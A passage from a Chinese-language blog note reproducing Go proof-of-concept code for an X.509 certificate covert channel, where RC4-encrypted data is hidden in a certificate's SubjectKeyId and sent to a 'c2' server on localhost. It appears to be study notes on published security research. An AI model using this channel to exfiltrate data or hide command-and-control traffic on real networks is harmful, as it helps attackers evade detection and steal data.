<span class="comment">//fmt.Println("Tasks: ", v.CRLDistributionPoints)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> bytes.Compare(rdata, []<span class="keyword">byte</span>(<span class="string">"DONE"</span>)) == <span class="number">0</span> &#123;</span><br><span class="line">			log.Println(<span class="string">"End of data reached"</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		conn.Close()</span><br><span class="line">		fmt.Println(<span class="string">"Total Received: "</span>, <span class="built_in">len</span>(fdata))</span><br><span class="line">		time.Sleep(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">"Data received: "</span>, <span class="built_in">len</span>(fdata))</span><br><span class="line">	fmt.Printf(<span class="string">"Md5: %x"</span>, md5.Sum(fdata))</span><br><span class="line"></span><br><span class="line">	log.Print(<span class="string">"client: exiting"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	priv, _ := rsa.GenerateKey(rand.Reader, <span class="number">4096</span>)</span><br><span class="line">	c2_settings := settings&#123;<span class="string">"127.0.0.1"</span>, <span class="string">"4433"</span>, <span class="string">"EICAR"</span>, priv&#125;</span><br><span class="line">	SendData(c2_settings, <span class="string">"Im Alive"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>helper.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Helper code for demonstrating transfering a file over x509 extension covert channel.</span></span><br><span class="line"><span class="comment">Research paper over x509 covert channel: http://vixra.org/abs/1801.0016</span></span><br><span class="line"><span class="comment">Written by: Jason Reaves</span></span><br><span class="line"><span class="comment">ver1 - 2Jan2018</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">MIT License</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Copyright (c) 2018 Jason Reaves</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment">of this software and associated documentation files (the "Software"), to deal</span></span><br><span class="line"><span class="comment">in the Software without restriction, including without limitation the rights</span></span><br><span class="line"><span class="comment">to use, copy, modify, merge, publish, distribute, sublicense, and/or sell</span></span><br><span class="line"><span class="comment">copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment">furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The above copyright notice and this permission notice shall be included in all</span></span><br><span class="line"><span class="comment">copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment">IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment">FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment">AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment">LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,</span></span><br><span class="line"><span class="comment">OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE</span></span><br><span class="line"><span class="comment">SOFTWARE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">package</span> helper</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"crypto/rand"</span></span><br><span class="line">	<span class="string">"crypto/rc4"</span></span><br><span class="line">	<span class="string">"crypto/rsa"</span></span><br><span class="line">	<span class="comment">//	"crypto/tls"</span></span><br><span class="line">	<span class="string">"crypto/x509"</span></span><br><span class="line">	<span class="string">"crypto/x509/pkix"</span></span><br><span class="line">	<span class="comment">//"encoding/asn1"</span></span><br><span class="line">	<span class="comment">//"encoding/hex"</span></span><br><span class="line">	<span class="string">"encoding/pem"</span></span><br><span class="line">	<span class="comment">//"fmt"</span></span><br><span class="line">	<span class="comment">//"io/ioutil"</span></span><br><span class="line">	<span class="string">"log"</span></span><br><span class="line">	<span class="string">"math/big"</span></span><br><span class="line">	<span class="string">"time"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">encryptData</span><span class="params">(data <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line">	key := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">2</span>)</span><br><span class="line">	_, err := rand.Read(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">"Random data creation error: "</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	c, err := rc4.NewCipher(key)</span><br><span class="line">	enc := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(data))</span><br><span class="line">	c.XORKeyStream(enc, []<span class="keyword">byte</span>(data))</span><br><span class="line"></span><br><span class="line">	<span class="comment">//return hex.EncodeToString(enc)</span></span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">append</span>(key, enc...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DecryptData</span><span class="params">(data []<span class="keyword">byte</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	key := data[:<span class="number">2</span>]</span><br><span class="line">	c, err := rc4.NewCipher(key)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Println(<span class="string">"RC4 error: "</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	dec := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(data[<span class="number">2</span>:]))</span><br><span class="line">	c.XORKeyStream(dec, data[<span class="number">2</span>:])</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">string</span>(dec[:])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//func GenCertPriv(cn string, data string, crl []string) (*rsa.PrivateKey, []byte, []byte) &#123;</span></span><br><span class="line"><span class="comment">//	priv, _ := rsa.GenerateKey(rand.Reader, 4096)</span></span><br><span class="line"><span class="comment">//	c, p := GenCert(cn, data, crl, priv)</span></span><br><span class="line"><span class="comment">//	return priv, c, p</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenCertWithFile</span><span class="params">(cn <span class="keyword">string</span>, fdata []<span class="keyword">byte</span>, priv *rsa.PrivateKey)</span> <span class="params">([]<span class="keyword">byte</span>, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="keyword">return</span> GenCert(cn, fdata, []<span class="keyword">string</span>&#123;&#125;, priv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenCertWithString</span><span class="params">(cn <span class="keyword">string</span>, data <span class="keyword">string</span>, priv *rsa.PrivateKey)</span> <span class="params">([]<span class="keyword">byte</span>, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	encData := encryptData(data)</span><br><span class="line">	<span class="keyword">return</span> GenCert(cn, encData, []<span class="keyword">string</span>&#123;&#125;, priv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GenCert</span><span class="params">(cn <span class="keyword">string</span>, data []<span class="keyword">byte</span>, crl []<span class="keyword">string</span>, priv *rsa.PrivateKey)</span> <span class="params">([]<span class="keyword">byte</span>, []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">	<span class="comment">//extSubKeyId := pkix.Extension&#123;&#125;</span></span><br><span class="line">	<span class="comment">//extSubKeyId.Id = asn1.ObjectIdentifier&#123;2, 5, 29, 14&#125;</span></span><br><span class="line">	<span class="comment">//extSubKeyId.Critical = true</span></span><br><span class="line">	<span class="comment">//extSubKeyId.Value = []byte(`d99962b39e`)</span></span><br><span class="line"></span><br><span class="line">	ca := &amp;x509.Certificate&#123;</span><br><span class="line">		SerialNumber: big.NewInt(<span class="number">1337</span>),</span><br><span class="line">		Subject: pkix.Name&#123;</span><br><span class="line">			Country:            []<span class="keyword">string</span>&#123;<span class="string">"Neuland"</span>&#125;,</span><br><span class="line">			Organization:       []<span class="keyword">string</span>&#123;<span class="string">"Example Org"</span>&#125;,</span><br><span class="line">			OrganizationalUnit: []<span class="keyword">string</span>&#123;<span class="string">"Auto"</span>&#125;,</span><br><span class="line">			CommonName:         cn,</span><br><span class="line">		&#125;,</span><br><span class="line">		Issuer: pkix.Name&#123;</span><br><span class="line">			Country:            []<span class="keyword">string</span>&#123;<span class="string">"Neuland"</span>&#125;,</span><br><span class="line">			Organization:       []<span class="keyword">string</span>&#123;<span class="string">"Skynet"</span>&#125;,</span><br><span class="line">			OrganizationalUnit: []<span class="keyword">string</span>&#123;<span class="string">"Computer Emergency Response Team"</span>&#125;,</span><br><span class="line">			Locality:           []<span class="keyword">string</span>&#123;<span class="string">"Neuland"</span>&#125;,</span><br><span class="line">			Province:           []<span class="keyword">string</span>&#123;<span class="string">"Neuland"</span>&#125;,</span><br><span class="line">			StreetAddress:      []<span class="keyword">string</span>&#123;<span class="string">"Mainstreet 23"</span>&#125;,</span><br><span class="line">			PostalCode:         []<span class="keyword">string</span>&#123;<span class="string">"12345"</span>&#125;,</span><br><span class="line">			SerialNumber:       <span class="string">"23"</span>,</span><br><span class="line">			CommonName:         cn,</span><br><span class="line">		&#125;,</span><br><span class="line">		SignatureAlgorithm: x509.SHA512WithRSA,</span><br><span class="line">		PublicKeyAlgorithm: x509.ECDSA,</span><br><span class="line">		NotBefore:          time.Now(),</span><br><span class="line">		NotAfter:           time.Now().AddDate(<span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>),</span><br><span class="line">		<span class="comment">//SubjectKeyId:          encData,</span></span><br><span class="line">		BasicConstraintsValid: <span class="literal">true</span>,</span><br><span class="line">		IsCA:        <span class="literal">true</span>,</span><br><span class="line">		ExtKeyUsage: []x509.ExtKeyUsage&#123;x509.ExtKeyUsageClientAuth&#125;,</span><br><span class="line">		KeyUsage:    x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,</span><br><span class="line">		<span class="comment">//ExtraExtensions: []pkix.Extension&#123;extSubKeyId&#125;,</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		<span class="comment">//encData := encryptData(data)</span></span><br><span class="line">		<span class="comment">//ca.SubjectKeyId = encData</span></span><br><span class="line">		ca.SubjectKeyId = data</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(crl) &gt; <span class="number">0</span> &#123;</span><br><span class="line">		ca.CRLDistributionPoints = crl</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//priv, _ := rsa.GenerateKey(rand.Reader, 4096)</span></span><br><span class="line">	privPem := pem.EncodeToMemory(&amp;pem.Block&#123;</span><br><span class="line">		Type:  <span class="string">"RSA PRIVATE KEY"</span>,</span><br><span class="line">		Bytes: x509.MarshalPKCS1PrivateKey(priv),</span><br><span class="line">	&#125;)</span><br><span class="line">	pub := &amp;priv.PublicKey</span><br><span class="line">	ca_b, err := x509.CreateCertificate(rand.Reader, ca, ca, pub, priv)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">"create cert failed %#v"</span>, err)</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">"Cert Creation Error"</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	certPem := pem.EncodeToMemory(&amp;pem.Block&#123;</span><br><span class="line">		Type:  <span class="string">"CERTIFICATE"</span>,</span><br><span class="line">		Bytes: ca_b,</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> certPem, privPem</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里主要做个笔记记录一下，<a href="https://www.fidelissecurity.com/threatgeek/2018/02/exposing-x509-vulnerabilities" target="_blank" rel="noopener">原文在这里</a> </p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用X-509公钥证书传递进行隐匿传输数据"><span class="toc-number">1.</span> <span class="toc-text">使用X.509公钥证书传递进行隐匿传输数据</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&text=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&is_video=false&description=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=使用X.509公钥证书传递进行隐匿传输数据&body=Check out this article: http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&title=使用X.509公钥证书传递进行隐匿传输数据"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.leej.me/2018/02/11/使用X-509公钥证书传递进行隐匿传输数据/&name=使用X.509公钥证书传递进行隐匿传输数据&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2018 Leej
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/leejgod">Projects</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>
<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-86660611-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Disqus Comments -->


